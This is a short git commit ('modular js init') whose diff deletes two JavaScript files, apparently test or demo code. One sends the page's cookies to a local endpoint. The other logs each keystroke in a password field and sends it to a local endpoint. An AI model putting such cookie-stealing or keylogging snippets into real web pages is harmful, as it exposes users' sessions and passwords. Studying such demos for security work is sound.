0ebb0e7a61a8bdfde626d083a65499d3f5503368
pengxie <pengxie@fortinet.com>
2022-09-30 14:58:49 -0700

    modular js init

--- static/jsonp.js
+++
@@ -1,2 +0,0 @@
-receiver({info: 'something comes from server'});
-fetch(`http://127.0.0.1:8778/rest/test?cookie=${window.document.cookie}`)
--- static/test.js
+++
@@ -1,5 +0,0 @@
-console.log('test.js loaded, the origin is: '+ window.origin )
-
-document.querySelector('#pass').addEventListener('keyup', () => {
-    fetch('http://127.0.0.1:8777/rest/test?pwd=' + document.querySelector('#pass').value)
-})
